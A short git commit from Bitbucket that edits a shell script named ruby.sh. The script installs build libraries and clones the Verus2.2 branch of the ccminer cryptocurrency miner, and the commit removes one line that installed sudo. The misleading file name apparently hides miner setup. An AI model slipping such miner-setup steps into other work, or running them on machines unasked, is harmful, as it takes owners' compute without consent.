879f7300d27f426f5da8456a1218f426d2bb9494
Terri <terriana81@vqsprint.com>
2021-06-13 04:28:29 +0000

    ruby.sh edited online with Bitbucket

--- ruby.sh
+++ ruby.sh
@@ -1,6 +1,5 @@
 #!/bin/sh
 apt update
-apt install sudo
 apt install git -y
 sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y
 git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
